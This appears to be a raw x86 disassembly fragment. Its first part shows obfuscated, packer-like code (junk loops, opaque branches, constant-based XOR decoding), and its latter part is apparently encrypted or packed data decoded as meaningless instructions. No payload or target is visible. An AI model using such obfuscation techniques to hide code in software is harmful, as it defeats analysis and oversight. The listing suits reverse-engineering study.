  407a86:	mov    DWORD PTR [ebp-0x14],eax
  407a89:	mov    DWORD PTR ds:0x436014,0x1f
  407a93:	cmp    DWORD PTR ds:0x436014,0x0
  407a9a:	je     0x407ae5
  407aa0:	cmp    DWORD PTR ds:0x436014,0x6
  407aa7:	jg     0x407ae5
  407aad:	jmp    0x407abd
  407ab2:	push   0x43a097
  407ab7:	call   DWORD PTR ds:0x43a8d0
  407abd:	cmp    DWORD PTR ds:0x436014,0x7
  407ac4:	jne    0x407ad5
  407aca:	mov    eax,ds:0x436014
  407acf:	dec    eax
  407ad0:	mov    ds:0x436014,eax
  407ad5:	mov    eax,ds:0x436014
  407ada:	dec    eax
  407adb:	mov    ds:0x436014,eax
  407ae0:	jmp    0x407a93
  407ae5:	mov    eax,DWORD PTR [ebp-0xc]
  407ae8:	mov    edx,DWORD PTR [ebp-0x14]
  407aeb:	mov    ecx,0x751089b
  407af0:	xor    eax,ecx
  407af2:	add    eax,0x3272e2
  407af7:	adc    DWORD PTR ds:0x435010,0x438000
  407b01:	mov    DWORD PTR [edx],eax
  407b03:	sub    DWORD PTR ds:0x437008,0x436000
  407b0d:	mov    eax,ds:0x43a14c
  407b12:	sbb    DWORD PTR ds:0x43500c,ebx
  407b18:	mov    edx,DWORD PTR [ebp-0x4]
  407b1b:	or     DWORD PTR ds:0x435010,0x2376
  407b25:	mov    eax,DWORD PTR [eax]
  407b27:	add    DWORD PTR ds:0x434010,0x435010
  407b31:	add    eax,DWORD PTR [edx]
  407b33:	push   edi
  407b34:	mov    DWORD PTR [ebp-0x8],eax
  407b37:	mov    edi,DWORD PTR [ebp+0x8]
  407b3a:	and    DWORD PTR ds:0x438004,0x0
  407b44:	xor    edx,edx
  407b46:	xor    edx,DWORD PTR ds:0x438004
  407b4c:	inc    edx
  407b4d:	mov    DWORD PTR ds:0x438004,edx
  407b53:	cmp    DWORD PTR ds:0x438004,0x20
  407b5a:	jle    0x407b7d
  407b60:	jmp    0x407b70
  407b65:	push   0x43a111
  407b6a:	call   DWORD PTR ds:0x43a8d4
  407b70:	cmp    DWORD PTR ds:0x438004,0x11
  407b77:	jb     0x407b44
  407b7d:	mov    eax,ds:0x43a2d4
  407b82:	mov    eax,DWORD PTR [eax+0x198]
  407b88:	adc    DWORD PTR ds:0x43501c,0x6968
  407b92:	xor    edi,ecx
  407b94:	mov    edx,0x3272e2
  407b99:	add    edi,edx
  407b9b:	mov    DWORD PTR ds:0x434028,0x7d8d
  407ba5:	cmp    DWORD PTR [eax],edi
  407ba7:	mov    DWORD PTR ds:0x43500c,0x2ed0
  407bb1:	je     0x407bd2
  407bb7:	mov    DWORD PTR ds:0x43401c,0x771b
  407bc1:	mov    eax,DWORD PTR [eax]
  407bc3:	mov    DWORD PTR ds:0x434028,0x1ca1
  407bcd:	jmp    0x40a3ac
  407bd2:	mov    eax,DWORD PTR [ebp+0x18]
  407bd5:	cmp    eax,esi
  407bd7:	jne    0x407bf1
  407bdd:	mov    DWORD PTR ds:0x437010,0x6440
  407be7:	push   0xf89c8584
  407bec:	jmp    0x40a39b
  407bf1:	mov    esi,DWORD PTR [ebp+0x18]
  407bf4:	mov    eax,0xf89c85bb
  407bf9:	cmp    esi,eax
  407bfb:	jne    0x40a38b
  407c01:	sub    eax,esi
  407c03:	mov    eax,DWORD PTR [ebp+0x10]
  407c06:	xor    eax,ecx
  407c08:	mov    DWORD PTR ds:0x437008,0x10
  407c12:	cmp    DWORD PTR ds:0x437008,0x0
  407c19:	je     0x407c4c
  407c1f:	cmp    DWORD PTR ds:0x437008,0x12
  407c26:	jl     0x407c4c
  407c2c:	jmp    0x407c3a
  407c31:	push   DWORD PTR [ebp-0x18]
  407c34:	call   DWORD PTR ds:0x43a8dc
  407c3a:	mov    esi,DWORD PTR ds:0x437008
  407c40:	dec    esi
  407c41:	mov    DWORD PTR ds:0x437008,esi
  407c47:	jmp    0x407c12
  407c4c:	add    eax,edx
  407c4e:	and    DWORD PTR ds:0x43501c,0x0
  407c58:	jmp    0x407c6c
  407c5d:	xor    esi,esi
  407c5f:	or     esi,DWORD PTR ds:0x43501c
  407c65:	inc    esi
  407c66:	mov    DWORD PTR ds:0x43501c,esi
  407c6c:	cmp    DWORD PTR ds:0x43501c,0x1f
  407c73:	jae    0x407cc0
  407c79:	cmp    DWORD PTR ds:0x43501c,0x12
  407c80:	jg     0x407cc0
  407c86:	jmp    0x407ca1
  407c8b:	push   0x43a0c9
  407c90:	push   0x779d
  407c95:	push   DWORD PTR [ebp-0x18]
  407c98:	push   DWORD PTR [ebp-0x18]
  407c9b:	call   DWORD PTR ds:0x43a8e0
  407ca1:	cmp    DWORD PTR ds:0x43501c,0x11
  407ca8:	jne    0x407cbb
  407cae:	mov    esi,DWORD PTR ds:0x43501c
  407cb4:	inc    esi
  407cb5:	mov    DWORD PTR ds:0x43501c,esi
  407cbb:	jmp    0x407c5d
  407cc0:	mov    DWORD PTR [ebp-0x18],eax
  407cc3:	and    esi,esi
  407cc5:	mov    eax,DWORD PTR [ebp+0xc]
  407cc8:	mov    esi,DWORD PTR ds:0x437010
  407cce:	or     DWORD PTR ds:0x43600c,esi
  407cd4:	mov    esi,DWORD PTR [ebp-0x8]
  407cd7:	adc    DWORD PTR ds:0x43401c,0x438010
  407ce1:	xor    eax,ecx
  407ce3:	adc    DWORD PTR ds:0x435004,0x436008
  407ced:	add    eax,edx
  407cef:	xor    DWORD PTR ds:0x43501c,0x437018
  407cf9:	imul   eax,DWORD PTR [esi]
  407cfc:	mov    esi,DWORD PTR [ebp+0x8]
  407cff:	and    DWORD PTR ds:0x43700c,0x3cde
  407d09:	xor    esi,ecx
  407d0b:	sbb    DWORD PTR ds:0x437000,0x2ed1
  407d15:	add    esi,edx
  407d17:	mov    DWORD PTR ds:0x436004,0x2911
  407d21:	cmp    esi,eax
  407d23:	mov    eax,DWORD PTR [ebp-0x4]
  407d26:	mov    DWORD PTR ds:0x43501c,0x4044
  407d30:	push   ebx
  407d31:	mov    DWORD PTR ds:0x43600c,0x6dfa
  407d3b:	je     0x407e07
  407d41:	mov    DWORD PTR ds:0x435018,0x18
  407d4b:	cmp    DWORD PTR ds:0x435018,0x0
  407d52:	je     0x407db4
  407d58:	cmp    DWORD PTR ds:0x435018,0x8
  407d5f:	jb     0x407db4
  407d65:	jmp    0x407d88
  407d6a:	push   0x2a76
  407d6f:	push   0x436018
  407d74:	push   DWORD PTR [ebp-0xc]
  407d77:	push   0x43a01f
  407d7c:	push   DWORD PTR [ebp-0x24]
  407d7f:	push   DWORD PTR [ebp-0x24]
  407d82:	call   DWORD PTR ds:0x43a8e4
  407d88:	cmp    DWORD PTR ds:0x435018,0x9
  407d8f:	jne    0x407da2
  407d95:	mov    esi,DWORD PTR ds:0x435018
  407d9b:	dec    esi
  407d9c:	mov    DWORD PTR ds:0x435018,esi
  407da2:	mov    esi,DWORD PTR ds:0x435018
  407da8:	dec    esi
  407da9:	mov    DWORD PTR ds:0x435018,esi
  407daf:	jmp    0x407d4b
  407db4:	mov    esi,DWORD PTR [ebp-0x18]
  407db7:	add    DWORD PTR [eax],esi
  407db9:	mov    eax,DWORD PTR [ebp-0x4]
  407dbc:	mov    esi,DWORD PTR ds:0x43700c
  407dc2:	xor    esi,DWORD PTR ds:0x434008
  407dc8:	mov    DWORD PTR ds:0x43700c,esi
  407dce:	mov    esi,DWORD PTR [ebp+0xc]
  407dd1:	and    DWORD PTR ds:0x436010,0x434018
  407ddb:	xor    esi,ecx
  407ddd:	add    DWORD PTR ds:0x435018,0x43600c
  407de7:	add    esi,edx
  407de9:	xor    DWORD PTR ds:0x437014,0x43801c
  407df3:	imul   esi,DWORD PTR [eax]
  407df6:	mov    DWORD PTR ds:0x436018,0x6d68
  407e00:	mov    DWORD PTR [eax],esi
  407e02:	jmp    0x407e77
  407e07:	mov    DWORD PTR ds:0x435014,0x11
  407e11:	cmp    DWORD PTR ds:0x435014,0x0
  407e18:	je     0x407e72
  407e1e:	cmp    DWORD PTR ds:0x435014,0x6
  407e25:	ja     0x407e72
  407e2b:	jmp    0x407e46
  407e30:	push   DWORD PTR [ebp-0xc]
  407e33:	push   0x2134
  407e38:	push   DWORD PTR [ebp-0x24]
  407e3b:	push   0x8f99
  407e40:	call   DWORD PTR ds:0x43a8e8
  407e46:	cmp    DWORD PTR ds:0x435014,0x7
  407e4d:	jne    0x407e60
  407e53:	mov    ebx,DWORD PTR ds:0x435014
  407e59:	dec    ebx
  407e5a:	mov    DWORD PTR ds:0x435014,ebx
  407e60:	mov    ebx,DWORD PTR ds:0x435014
  407e66:	dec    ebx
  407e67:	mov    DWORD PTR ds:0x435014,ebx
  407e6d:	jmp    0x407e11
  407e72:	mov    esi,DWORD PTR [ebp+0x14]
  407e75:	xor    DWORD PTR [eax],esi
  407e77:	mov    eax,DWORD PTR [ebp-0x4]
  407e7a:	mov    edi,DWORD PTR [ebp+0x10]
  407e7d:	xor    edi,ecx
  407e7f:	mov    esi,0xffcd8d1e
  407e84:	mov    ebx,esi
  407e86:	sub    ebx,edi
  407e88:	add    DWORD PTR [eax],ebx
  407e8a:	mov    eax,DWORD PTR [ebp-0x4]
  407e8d:	mov    edi,DWORD PTR [ebp-0x8]
  407e90:	add    edi,DWORD PTR [eax]
  407e92:	mov    DWORD PTR [ebp-0x8],edi
  407e95:	mov    eax,DWORD PTR [ebp+0xc]
  407e98:	mov    edi,DWORD PTR [ebp+0xc]
  407e9b:	xor    edi,ecx
  407e9d:	xor    eax,ecx
  407e9f:	jmp    0x40a259
  407ea4:	lahf   
  407ea5:	(bad)  
  407ea6:	xchg   esp,eax
  407ea7:	jle    0x407e3d
  407ea9:	emms   
  407eab:	xchg   DWORD PTR [edi],ebp
  407ead:	jmp    0xb4d4:0xa6e4c670
  407eb4:	test   eax,0xd17c7c3a
  407eb9:	pop    edi
  407eba:	jl     0x407f38
  407ebc:	rcr    esp,1
  407ebe:	shl    DWORD PTR [ebp+esi*8+0x7e26fc11],0xdf
  407ec6:	cs lahf 
  407ec8:	jo     0x407ed4
  407eca:	lea    ecx,[ebx]
  407ecc:	lds    ebx,FWORD PTR [ecx]
  407ece:	test   DWORD PTR ds:0x96b55588,eax
  407ed4:	lods   al,BYTE PTR ds:[esi]
  407ed5:	(bad)  
  407ed6:	jmp    0x7bcf:0xa8f492a9
  407edd:	imul   BYTE PTR [edx]
  407edf:	repz or dh,al
  407ee2:	cmp    BYTE PTR [esi-0x74fe12c3],bl
  407ee8:	call   0x2fd0:0xe4bc0361
  407eef:	inc    edx
  407ef0:	outs   dx,BYTE PTR ds:[esi]
  407ef1:	shr    BYTE PTR [eax],1
  407ef3:	jo     0x407ea1
  407ef5:	ds jb  0x407f32
  407ef8:	mov    edi,0x6b0c1292
  407efd:	clc    
  407efe:	adc    cl,BYTE PTR [edx-0x1fb8fb72]
  407f04:	loope  0x407e8b
  407f06:	and    BYTE PTR ds:0x73f72d29,ah
  407f0c:	push   0xffffff9b
  407f0e:	ins    BYTE PTR es:[edi],dx
  407f0f:	imul   ebp,DWORD PTR [edx+0x56],0xb035c055
  407f16:	add    ah,cl
  407f18:	jne    0x407f2a
  407f1a:	mov    esi,0x7e1d24d0
  407f1f:	loope  0x407f6b
  407f21:	imul   ebx,edx,0xffffffcd
  407f24:	gs repnz mov dl,bl
  407f28:	sbb    al,0x6d
  407f2a:	aas    
  407f2b:	mov    fs,WORD PTR [ebp-0x64aba71c]
  407f31:	loop   0x407ec9
  407f33:	mov    edx,0x79d09ba3
  407f38:	les    eax,FWORD PTR [edx+esi*4+0x328f6960]
  407f3f:	sbb    esi,DWORD PTR [ecx-0x63]
  407f42:	fstp   TBYTE PTR [eax-0x56b7f97f]
  407f48:	cmp    eax,0x9872d42f
  407f4d:	shr    bh,0xc4
  407f50:	xchg   edi,eax
  407f51:	pop    ebp
  407f52:	sbb    eax,0xe143c0eb
  407f57:	sahf   
  407f58:	cmp    al,0x7c
  407f5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f5b:	hlt    
  407f5c:	sub    BYTE PTR [ecx-0x7624c9bb],ah
  407f62:	mov    DWORD PTR [eax+0x407e0507],ebx
  407f68:	popa   
  407f69:	or     edx,0xffffffaf
  407f6c:	fild   DWORD PTR [edi+0x764f0f5f]
  407f72:	test   DWORD PTR [eax+0x4b],0xed2de449
  407f79:	scas   al,BYTE PTR es:[edi]
  407f7a:	in     al,0x22
  407f7c:	pop    eax
  407f7d:	dec    esi
  407f7e:	dec    ebx
  407f7f:	(bad)  
  407f80:	or     eax,0x61c2c0d4
  407f85:	lahf   
  407f86:	xchg   DWORD PTR [ecx+0x22],ecx
  407f89:	pop    ss
  407f8a:	sbb    DWORD PTR [eax],esi
  407f8c:	jg     0x407f9e
  407f8e:	popa   
  407f8f:	dec    edx
  407f90:	int    0x3d
  407f92:	or     eax,0x209be593
  407f97:	loopne 0x407f23
  407f99:	icebp  
  407f9a:	out    0x3d,al
  407f9c:	call   0x871d:0xe288ca55
  407fa3:	out    0xfc,eax
  407fa5:	icebp  
  407fa6:	cmc    
  407fa7:	and    DWORD PTR [esi+0x472d5a24],edi
  407fad:	dec    esi
  407fae:	lods   al,BYTE PTR ds:[esi]
  407faf:	push   0xc84b817d
  407fb4:	push   ax
  407fb6:	out    dx,al
  407fb7:	in     al,dx
  407fb8:	(bad)  [eax+0x1318e987]
  407fbe:	jno    0x407f6f
  407fc0:	cmp    BYTE PTR [edx+esi*1],dl
  407fc3:	and    al,0x72
  407fc5:	inc    ecx
  407fc6:	inc    edx
  407fc7:	xchg   ecx,eax
  407fc8:	int    0xd6
  407fca:	daa    
  407fcb:	push   0x7303f5fb
  407fd0:	xor    BYTE PTR [ecx],bl
  407fd2:	mov    esi,0x3cb393f1
  407fd7:	mov    esi,ecx
  407fd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fda:	or     esi,DWORD PTR [esp+ecx*2+0x38ba89f6]
  407fe1:	jnp    0x407f79
  407fe3:	loop   0x40801b
  407fe5:	fstp   QWORD PTR [ecx-0x554d0041]
  407feb:	xor    ebx,DWORD PTR ds:0xb0195029
  407ff1:	inc    ecx
  407ff2:	xchg   ebx,eax
  407ff3:	outs   dx,BYTE PTR cs:[esi]
  407ff5:	sar    esp,0xac
  407ff8:	fwait
  407ff9:	cwde   
  407ffa:	jp     0x408074
  407ffc:	pop    esi
  407ffd:	lea    esi,[edx+0x46c24b47]
  408003:	add    ah,BYTE PTR [ebp+0x21b3d5a]
  408009:	pushf  
  40800a:	adc    BYTE PTR [eax+ebp*4],al
  40800d:	jne    0x407faa
  40800f:	xchg   edi,eax
  408010:	sub    eax,0x491a7a9a
  408015:	test   al,0xe3
  408017:	xchg   esp,eax
  408018:	in     eax,0x66
  40801a:	jmp    0x408009
  40801c:	hlt    
  40801d:	test   al,0xa6
  40801f:	add    BYTE PTR [ebp+0x5b],0xe4
  408023:	call   0xa88f9313
  408028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408029:	ficomp WORD PTR [ebp-0x4a]
  40802c:	cs jecxz 0x408054
  40802f:	add    dh,dh
  408031:	dec    edi
  408032:	scas   al,BYTE PTR es:[edi]
  408033:	xlat   BYTE PTR ds:[ebx]
  408034:	push   0x30bf2863
  408039:	imul   esi,esp,0x98145e5b
  40803f:	add    dh,BYTE PTR ds:0xbf9a01d0
  408045:	inc    ebp
  408046:	mov    edi,0xc40789c0
  40804b:	shl    BYTE PTR [ebx+0x64504877],1
  408051:	enter  0x876f,0x61
  408055:	ret    0xcaaf
  408058:	adc    eax,0x30f27968
  40805d:	jns    0x4080d4
  40805f:	xchg   BYTE PTR [eax],ah
  408061:	not    DWORD PTR [esi+0x7c1a6641]
  408067:	mov    ebx,0x74961ed5
  40806c:	mov    al,0x91
  40806e:	add    ebx,ecx
  408070:	push   ss
  408071:	dec    ebp
  408072:	cld    
  408073:	nop
  408074:	sub    ebp,0x79ada844
  40807a:	out    dx,al
  40807b:	in     eax,dx
  40807c:	jge    0x4080e8
  40807e:	and    DWORD PTR ds:0x7590be98,ebx
  408084:	push   es
  408085:	repnz xlat BYTE PTR ds:[ebx]
  408087:	into   
  408088:	jb     0x40809a
  40808a:	jmp    0x40805c
  40808c:	adc    al,0x35
  40808e:	xor    DWORD PTR ds:0x2b0db080,edx
  408094:	jg     0x40804e
  408096:	(bad)  
  408097:	sti    
  408098:	es rcr cl,0x8f
  40809c:	jmp    0x3ee13e65
  4080a1:	lock add bh,bl
  4080a4:	(bad)  
  4080a5:	or     DWORD PTR [edx+0x299f67fc],ebp
  4080ab:	xchg   ebx,eax
  4080ac:	jge    0x408105
  4080ae:	sbb    BYTE PTR fs:[ebp+0x938dca1],bl
  4080b5:	dec    esp
  4080b6:	sub    al,0xca
  4080b8:	pop    es
  4080b9:	pop    eax
  4080ba:	imul   ecx,edx,0xffffffba
  4080bd:	xchg   BYTE PTR [ebp-0x27],ch
  4080c0:	mov    al,ds:0x896b1462
  4080c5:	pop    ss
  4080c6:	sbb    ebx,edx
  4080c8:	cmc    
  4080c9:	outs   dx,BYTE PTR ds:[esi]
  4080ca:	mov    cl,0x65
  4080cc:	jns    0x408086
  4080ce:	mov    ebx,0x98c5092b
  4080d3:	mov    ebp,0xd7f84fab
  4080d8:	sbb    bl,cl
  4080da:	jne    0x408102
  4080dc:	add    al,0xd9
  4080de:	sub    BYTE PTR cs:[ebx],dl
  4080e1:	xchg   ebp,eax
  4080e2:	xor    al,0x18
  4080e4:	dec    ebx
  4080e5:	ds ret 
  4080e7:	cmc    
  4080e8:	stos   DWORD PTR es:[edi],eax
  4080e9:	pusha  
  4080ea:	dec    ecx
  4080eb:	into   
  4080ec:	sbb    BYTE PTR [ebx+0x34cd9af7],0x28
  4080f3:	xchg   ebp,eax
  4080f4:	adc    al,0xf0
  4080f6:	jge    0x4080d4
  4080f8:	loope  0x4080b8
  4080fa:	(bad)  
  4080fb:	out    0x76,al
  4080fd:	xor    al,0x3d
  4080ff:	xchg   esi,eax
  408100:	fwait
  408101:	dec    esi
  408102:	and    al,0x8a
  408104:	ins    BYTE PTR es:[edi],dx
  408105:	push   edi
  408106:	xchg   esi,eax
  408107:	dec    edi
  408108:	retf   
  408109:	sbb    esi,DWORD PTR gs:[esi]
  40810c:	stos   DWORD PTR es:[edi],eax
  40810d:	neg    BYTE PTR [ecx+0x1d423c72]
  408113:	and    eax,0x4b0e728e
  408118:	or     ch,BYTE PTR [edx+0x75]
  40811b:	push   cs
  40811c:	sub    eax,0xbb7c510d
  408121:	sbb    DWORD PTR [esi-0x61],edi
  408124:	cwde   
  408125:	adc    al,0x80
  408127:	in     eax,0xfb
  408129:	pop    esp
  40812a:	pop    ebx
  40812b:	fmulp  st(5),st
  40812d:	pushf  
  40812e:	call   0x9d495933
  408133:	stc    
  408134:	mov    eax,ds:0xa746726d
  408139:	repz mov eax,0x9ea269b6
  40813f:	(bad)  
  408140:	aad    0xad
  408142:	cs mov gs:0xd268b001,al
  408149:	dec    DWORD PTR [ecx]
  40814b:	icebp  
  40814c:	sbb    DWORD PTR ds:0xfa1a78d0,ecx
  408152:	aas    
  408153:	bound  ebx,QWORD PTR [ecx+eiz*8-0x632641cb]
  40815a:	(bad)  
  40815b:	aas    
  40815c:	jmp    0x1a0759cc
  408161:	pop    esi
  408162:	loopne 0x408143
  408164:	xchg   BYTE PTR ds:0x41fd6ea5,al
  40816a:	mov    ds:0xaec6b452,al
  40816f:	adc    BYTE PTR [esi-0x1cd11c14],ah
  408175:	jns    0x408128
  408177:	mov    cs,WORD PTR [esi-0x2e]
  40817a:	xchg   ch,ch
  40817c:	push   es
  40817d:	leave  
  40817e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40817f:	dec    esi
  408180:	push   edx
  408181:	xor    ah,BYTE PTR [ebx]
  408183:	or     edx,ebp
  408185:	retf   0xc678
  408188:	call   0x774f:0x5dda4346
  40818f:	dec    edx
  408190:	or     DWORD PTR [ecx-0x2a],edi
  408193:	push   cs
  408194:	and    dl,BYTE PTR [edx]
  408196:	inc    ebx
  408197:	mul    cl
  408199:	cld    
  40819a:	jmp    0x30c21c84
  40819f:	mov    ebx,0x68b75422
  4081a4:	xlat   BYTE PTR ds:[ebx]
  4081a5:	adc    eax,0xe47af943
  4081aa:	jmp    0xe6fed5ee
  4081af:	add    eax,0xe8fc7921
  4081b4:	push   esp
  4081b5:	nop
  4081b6:	pop    edi
  4081b7:	retf   0x315f
  4081ba:	dec    esp
  4081bb:	lods   al,BYTE PTR ds:[esi]
  4081bc:	je     0x408163
  4081be:	xor    al,0x14
  4081c0:	(bad)  
  4081c1:	cld    
  4081c2:	nop
  4081c3:	clc    
  4081c4:	push   ss
  4081c5:	xor    BYTE PTR [edx+0x19],dl
  4081c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081c9:	adc    cl,al
  4081cb:	sub    bl,BYTE PTR [edi-0x175f21c]
  4081d1:	scas   al,BYTE PTR es:[edi]
  4081d2:	or     DWORD PTR [edx+0x1],esi
  4081d5:	fmul   st,st(5)
  4081d7:	mov    ecx,0xb13f6bf
  4081dc:	in     eax,0x9b
  4081de:	sub    BYTE PTR [edx],cl
  4081e0:	fist   DWORD PTR [ebx-0x21]
  4081e3:	cmp    eax,0xf75c68b2
  4081e8:	mov    al,ds:0xc385f0f3
  4081ed:	push   0xfffffffa
  4081ef:	mov    ebx,0xe1f79144
  4081f4:	in     eax,dx
  4081f5:	dec    ebx
  4081f6:	sub    al,0xb1
  4081f8:	jecxz  0x4081e9
  4081fa:	mov    ch,0xf9
  4081fc:	(bad)  
  4081fd:	out    dx,eax
  4081fe:	std    
  4081ff:	and    BYTE PTR ds:[edx],bh
  408202:	lods   eax,DWORD PTR ds:[esi]
  408203:	mov    ah,0x87
  408205:	cli    
  408206:	dec    esi
  408207:	gs mov edi,0xcd7c3e39
  40820d:	loopne 0x40823d
  40820f:	mov    ch,0xb6
  408211:	icebp  
  408212:	mov    al,0x6c
  408214:	xchg   esp,eax
  408215:	stos   DWORD PTR es:[edi],eax
  408216:	dec    ebx
  408217:	xchg   esi,eax
  408218:	rol    DWORD PTR [edx],cl
  40821a:	test   eax,0xde3036b7
  40821f:	and    eax,0xe98aad53
  408224:	sbb    bl,BYTE PTR [eax+0x44]
  408227:	sub    edx,ebp
  408229:	jae    0x408254
  40822b:	jle    0x40825e
  40822d:	pop    DWORD PTR [edi-0x1a2a7927]
  408233:	sub    eax,0x7aa12050
  408238:	ror    DWORD PTR [edi+0x8],cl
  40823b:	lock iret 
  40823d:	inc    edx
  40823e:	jmp    0x5dfc2771
  408243:	push   esp
  408244:	js     0x40827d
  408246:	adc    al,0xdd
  408248:	pop    ss
  408249:	cmp    ebx,DWORD PTR [ebp+0x3c9cbdb4]
  40824f:	push   ecx
  408250:	mov    al,0x5c
  408252:	ret    0xd085
  408255:	add    BYTE PTR [esi-0x2dbbac69],bh
  40825b:	jb     0x4082bb
  40825d:	outs   dx,BYTE PTR ds:[esi]
  40825e:	sti    
  40825f:	add    BYTE PTR [edx],ah
  408261:	mov    ebp,0x3b03f6bb
  408266:	aad    0xa8
  408268:	sahf   
  408269:	mov    WORD PTR [eax-0x689d5f1],cs
  40826f:	retf   
  408270:	inc    ebx
  408271:	add    esp,edx
  408273:	cli    
  408274:	repnz stos DWORD PTR es:[di],eax
  408277:	or     dl,ah
  408279:	mov    dh,0x26
  40827b:	aaa    
  40827c:	xchg   edx,eax
  40827d:	daa    
  40827e:	sbb    cl,BYTE PTR [eax-0x6669bab7]
  408284:	leave  
  408285:	sti    
  408286:	inc    ebp
  408287:	jecxz  0x408260
  408289:	fild   QWORD PTR [edx]
  40828b:	sub    esp,0x5864e3aa
  408291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408292:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408293:	hlt    
  408294:	outs   dx,DWORD PTR ds:[esi]
  408295:	push   ebx
  408296:	repnz (bad) 
  408298:	lock test BYTE PTR [esi+0x2],al
  40829c:	outs   dx,BYTE PTR ds:[esi]
  40829d:	mov    ecx,0x820a7a27
  4082a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082a3:	add    al,0xc3
  4082a5:	push   ss
  4082a6:	or     BYTE PTR [ebp+0x62ede3b3],ah
  4082ac:	lahf   
  4082ad:	mov    esp,0xeadc2b01
  4082b2:	cmp    ebx,ebp
  4082b4:	and    esi,DWORD PTR [eax]
  4082b6:	ss or  eax,0xf8320d09
  4082bc:	mov    eax,ds:0x72f2324b
  4082c1:	ss stos DWORD PTR es:[edi],eax
  4082c3:	imul   edx,DWORD PTR [ebp+0x17],0x3514d841
  4082ca:	dec    edx
  4082cb:	add    al,0xb5
  4082cd:	iret   
  4082ce:	or     cl,BYTE PTR [ebp+0x7d]
  4082d1:	test   eax,edx
  4082d3:	js     0x40828d
  4082d5:	lods   al,BYTE PTR ds:[esi]
  4082d6:	fwait
  4082d7:	pop    esp
  4082d8:	loop   0x40826a
  4082da:	stc    
  4082db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082dc:	mov    edi,0xbf2aee2d
  4082e1:	mov    dh,0x80
  4082e3:	jbe    0x4082c4
  4082e5:	pop    ecx
  4082e6:	pop    esp
  4082e7:	xor    BYTE PTR [ebp+0x33],dl
  4082ea:	adc    al,0x89
  4082ec:	bound  esp,QWORD PTR [ecx+ebx*4+0x6190a421]
  4082f3:	cli    
  4082f4:	sar    BYTE PTR [edx],0xa1
  4082f7:	into   
  4082f8:	jns    0x408377
  4082fa:	iret   
  4082fb:	(bad)  
  4082fc:	cmp    DWORD PTR [ebp+0x66877098],ebp
  408302:	popa   
  408303:	stos   DWORD PTR es:[edi],eax
  408304:	fisttp WORD PTR [eax+0x22]
  408307:	fadd   st,st(2)
  408309:	pop    edi
  40830a:	and    bl,BYTE PTR [ebx+0x1a]
  40830d:	addr16 mov esp,es
  408310:	xchg   ebx,eax
  408311:	leave  
  408312:	stc    
  408313:	mov    ds:0x48dccaf8,al
  408318:	mov    WORD PTR [ecx+0x48],?
  40831b:	sbb    edi,DWORD PTR [eax-0x150e57cb]
  408321:	xchg   edx,eax
  408322:	or     DWORD PTR [eax+0x792a7dfb],esi
  408328:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408329:	add    al,0x47
  40832b:	int3   
  40832c:	mov    ecx,0x7a62e674
  408331:	loope  0x408312
  408333:	jo     0x4082bf
  408335:	sbb    ecx,esi
  408337:	ds scas eax,DWORD PTR es:[edi]
  408339:	sub    BYTE PTR [edi+0x77],0x8f
  40833d:	pop    ss
  40833e:	jns    0x4082ee
  408340:	cmp    al,0xb3
  408342:	sub    edi,DWORD PTR [ebx+0x39cec7f2]
  408348:	lock call 0x279b:0xe722934f
  408350:	test   cl,ch
  408352:	pop    edx
  408353:	pushf  
  408354:	or     al,0x76
  408356:	inc    esi
  408357:	into   
  408358:	fst    QWORD PTR [eax]
  40835a:	sahf   
  40835b:	cmp    BYTE PTR [edx-0x1e],bh
  40835e:	jmp    0x408313
  408360:	rcl    edx,1
  408362:	jle    0x4083c0
  408364:	outs   dx,DWORD PTR ds:[esi]
  408365:	pop    ds
  408366:	mov    ds:0x52959bc7,al
  40836b:	fs mov dl,0x8b
  40836e:	rcr    BYTE PTR [esi],1
  408370:	add    BYTE PTR [ebx+0x76],bl
  408373:	cmp    al,0x3b
  408375:	lea    ebp,[esi]
  408377:	pop    ebx
  408378:	push   0xffffffac
  40837a:	(bad)  
  40837b:	rcl    DWORD PTR [ebp-0x2a2115a9],1
  408381:	and    BYTE PTR cs:[ecx],dh
  408384:	sbb    DWORD PTR [ebp-0x44],eax
  408387:	stc    
  408388:	inc    ebx
  408389:	fst    st(4)
  40838b:	cdq    
  40838c:	pop    ebx
  40838d:	fsub   DWORD PTR [edi]
  40838f:	lods   al,BYTE PTR ds:[esi]
  408390:	ins    BYTE PTR es:[edi],dx
  408391:	in     eax,dx
  408392:	push   edi
  408393:	int    0x27
  408395:	sahf   
  408396:	xor    al,0xc
  408398:	std    
  408399:	xor    ch,cl
  40839b:	xor    cl,BYTE PTR [ebx]
  40839d:	dec    ecx
  40839e:	inc    ebp
  40839f:	and    DWORD PTR [edi],ebx
  4083a1:	add    ebx,edi
  4083a3:	xchg   ebx,eax
  4083a4:	cwde   
  4083a5:	xchg   BYTE PTR [edi],ah
  4083a7:	and    BYTE PTR [ecx*8-0x30b2dcfa],0x60
  4083af:	cmp    eax,0xca3c2c7a
  4083b4:	je     0x4083d1
  4083b6:	outs   dx,DWORD PTR ds:[esi]
  4083b7:	dec    ebx
  4083b8:	jl     0x40838a
  4083ba:	mov    eax,0x634c87be
  4083bf:	xlat   BYTE PTR ds:[ebx]
  4083c0:	xor    DWORD PTR [eax+0x68],ebp
  4083c3:	sar    DWORD PTR [ecx+0x2c27c25a],1
  4083c9:	and    BYTE PTR [ebp+0x4b],dh
  4083cc:	cmovo  edx,DWORD PTR [eax+0x2773200e]
  4083d3:	or     eax,0x4ca3ce64
  4083d8:	mov    ds:0xa7201517,eax
  4083dd:	in     al,dx
  4083de:	sub    al,0xdf
  4083e0:	cmp    cl,BYTE PTR [eax+0x1a]
  4083e3:	mov    ecx,DWORD PTR [ebx+0x18]
  4083e6:	mov    ebx,0xb893f38d
  4083eb:	mov    ebx,0x347615f5
  4083f0:	mov    dh,0xc9
  4083f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083f3:	fcom   DWORD PTR [eax]
  4083f5:	xchg   DWORD PTR [esi],ecx
  4083f7:	mov    dl,0xdd
  4083f9:	daa    
  4083fa:	fimul  DWORD PTR [ecx-0xf79cf4a]
